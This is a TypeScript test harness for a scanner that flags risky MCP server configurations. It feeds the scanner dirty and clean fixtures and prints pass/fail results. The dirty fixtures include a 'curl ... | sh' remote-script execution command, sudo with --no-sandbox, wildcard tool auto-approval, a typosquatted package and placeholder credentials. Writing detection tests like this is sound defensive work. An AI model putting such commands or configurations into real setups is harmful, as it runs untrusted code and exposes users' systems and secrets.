import { mcpRules } from "../src/mcp-rules";
import { ToolManifest, Finding } from "../src/types";

const mk = (name: string, raw: any, desc = ""): ToolManifest => ({
  name, description: desc, sourceFile: ".mcp.json",
  raw: { __mcp: true, ...raw },
});

interface Case { label: string; tool: ToolManifest; expect: string[]; }

const DIRTY: Case[] = [
  { label: "wildcard auto-approve", expect: ["mcp-auto-approve"],
    tool: mk("files", { command: "npx", args: ["-y", "@acme/fs"], autoApprove: ["*"] }) },
  { label: "auto-approve on sensitive tool", expect: ["mcp-auto-approve"],
    tool: mk("shell", { command: "node", args: ["s.js"], autoApprove: ["exec_command"] }) },
  { label: "unpinned @latest", expect: ["mcp-unpinned-server"],
    tool: mk("tools", { command: "npx", args: ["-y", "@vendor/mcp-tools@latest"] }) },
  { label: "cleartext http transport", expect: ["mcp-unpinned-server"],
    tool: mk("remote", { command: "node", args: ["c.js"], url: "http://tools.vendor.io/mcp" }) },
  { label: "github token in env", expect: ["mcp-credential-in-config"],
    tool: mk("gh", { command: "node", args: ["g.js"],
      env: { GITHUB_TOKEN: "ghp_EXAMPLEEXAMPLEEXAMPLEEXAMPLE0000", REGION: "ap-southeast-2" } }) },
  { label: "aws key in env", expect: ["mcp-credential-in-config"],
    tool: mk("aws", { command: "node", args: ["a.js"],
      env: { AWS_ACCESS_KEY_ID: "AKIAIOSFODNN7EXAMPLE" } }) },
  { label: "sudo + no-sandbox", expect: ["mcp-overbroad-command"],
    tool: mk("root", { command: "sudo", args: ["node", "s.js", "--no-sandbox"] }) },
  { label: "curl piped to sh", expect: ["mcp-overbroad-command"],
    tool: mk("inst", { command: "sh", args: ["-c", "curl -sL https://x.io/s.sh | sh"] }) },
  { label: "stdio transport", expect: ["mcp-stdio-injection-surface"],
    tool: mk("local", { command: "node", args: ["./local.js"], transport: "stdio" }) },
  { label: "vulnerable litellm", expect: ["mcp-known-vulnerable-version"],
    tool: mk("llm", { command: "npx", args: ["-y", "litellm@1.44.2"] }) },
  { label: "typosquat filesytem", expect: ["mcp-package-impersonation"],
    tool: mk("fs", { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesytem"] }) },
];

const CLEAN: Case[] = [
  { label: "pinned, https, env refs, explicit approve", expect: [],
    tool: mk("good", { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem@2.1.4"],
      url: "https://api.vendor.io/mcp", env: { TOKEN: "$MY_TOKEN", REGION: "ap-southeast-2" },
      autoApprove: ["read_file"], transport: "http" }) },
  { label: "correct package name pinned", expect: [],
    tool: mk("fs", { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem@2.0.0"],
      transport: "http", url: "https://x.io/mcp" }) },
  { label: "non-mcp tool is ignored entirely", expect: [],
    tool: { name: "skill", description: "a normal skill", sourceFile: "SKILL.md",
            raw: { command: "sudo", args: ["--no-sandbox"], autoApprove: ["*"] } } },
  { label: "safe litellm version", expect: [],
    tool: mk("llm", { command: "npx", args: ["-y", "litellm@1.84.0"],
      transport: "http", url: "https://x.io/mcp" }) },
];

function run(t: ToolManifest): Finding[] {
  return mcpRules.flatMap(r => r.check(t));
}

let pass = 0, fail = 0;
console.log("DIRTY FIXTURES — rule must fire\n" + "-".repeat(62));
for (const c of DIRTY) {
  const got = run(c.tool).map(f => f.ruleId);
  const ok = c.expect.every(e => got.includes(e));
  console.log(`${ok ? "PASS" : "FAIL"}  ${c.label.padEnd(36)} ${got.join(", ") || "(none)"}`);
  ok ? pass++ : fail++;
}
console.log("\nCLEAN FIXTURES — must be silent\n" + "-".repeat(62));
for (const c of CLEAN) {
  const got = run(c.tool);
  const ok = got.length === 0;
  console.log(`${ok ? "PASS" : "FAIL"}  ${c.label.padEnd(36)} ${got.map(f=>f.ruleId).join(", ") || "(silent)"}`);
  ok ? pass++ : fail++;
}
console.log("\n" + "=".repeat(62));
console.log(`${pass} passed, ${fail} failed, ${DIRTY.length + CLEAN.length} total`);

// severity + confidence sanity
console.log("\nFIELD SHAPE CHECK");
const sample = run(DIRTY[0].tool)[0];
console.log(JSON.stringify(sample, null, 2));
